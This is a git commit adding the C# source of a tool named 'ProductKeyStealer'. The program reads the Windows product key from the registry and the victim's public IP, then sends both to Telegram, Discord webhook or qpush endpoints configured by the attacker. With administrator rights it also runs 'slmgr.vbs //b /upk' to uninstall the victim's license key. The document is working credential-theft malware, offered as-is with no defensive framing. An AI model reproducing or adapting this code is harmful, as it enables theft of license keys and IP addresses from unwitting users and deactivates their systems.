2f9d73385b25f6664cf51c30fd37c205506db1a2
Sneppi <72905057+Snephanie@users.noreply.github.com>
2021-12-03 00:44:56 -0500

    Add project files.

---
+++ AssemblyInfo.cs
@@ -0,0 +1,15 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("Steals product keys")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("lmfao inc.")]
+[assembly: AssemblyProduct("ProductKeyStealer")]
+[assembly: AssemblyCopyright("Copyright © 2021")]
+[assembly: AssemblyTrademark("lmfao inc.")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("f7d7ee75-e2b9-44e1-9c00-2bda70d48384")]
+[assembly: AssemblyVersion("1.3.3.7")]
+[assembly: AssemblyFileVersion("1.3.3.7")]
---
+++ Program.cs
@@ -0,0 +1,61 @@
+﻿using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Http;
+using System.Security.Principal;
+
+namespace ProductKeyStealer
+{
+    class Program
+    {
+        public static void Main()
+        {
+            using (var client = new WebClient())
+            {
+                string telegrambottoken = ""; //Message @BotFather to get a bot token
+                string telegramchatid = ""; //Message @getidsbot to get your chat id
+                string telegramtext = $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}";
+                string telegrambot = $"https://api.telegram.org/bot{telegrambottoken}/sendMessage?chat_id={telegramchatid}&text={telegramtext}";
+
+                string discordwebhook = "";
+                Dictionary<string, string> discordmessage = new Dictionary<string, string> { { "content", $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}" }, { "username", "KeyStealer" } };
+
+                string qpushname = "";
+                string qpushcode = "";
+                Dictionary<string, string> qpushmessage = new Dictionary<string, string> { { "name", qpushname }, { "code", qpushcode }, { "msg[text]", $"New key!\n{WinProdKeyFind.KeyDecoder.GetWindowsProductKeyFromRegistry()}\nIP: {client.DownloadString("https://api.ipify.org")}" } };
+                HttpClient httpclient = new HttpClient();
+
+                if (telegrambottoken.Length != 0)
+                {
+                    if (telegramchatid.Length != 0)
+                    {
+                        httpclient.PostAsync(telegrambot, null).GetAwaiter().GetResult();
+                    }
+                }
+                if (discordwebhook.Length != 0)
+                {
+                    httpclient.PostAsync(discordwebhook, new FormUrlEncodedContent(discordmessage)).GetAwaiter().GetResult();
+                }
+                if (qpushname.Length != 0)
+                {
+                    if (qpushname.Length != 0)
+                    {
+                        httpclient.PostAsync("https://qpush.me/pusher/push_site/", new FormUrlEncodedContent(qpushmessage)).GetAwaiter().GetResult();
+                    }
+                }
+                if (IsAdministrator())
+                {
+                    Process.Start("slmgr.vbs", "//b /upk");
+                }
+            }
+        }
+        public static bool IsAdministrator()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
+    }
+}
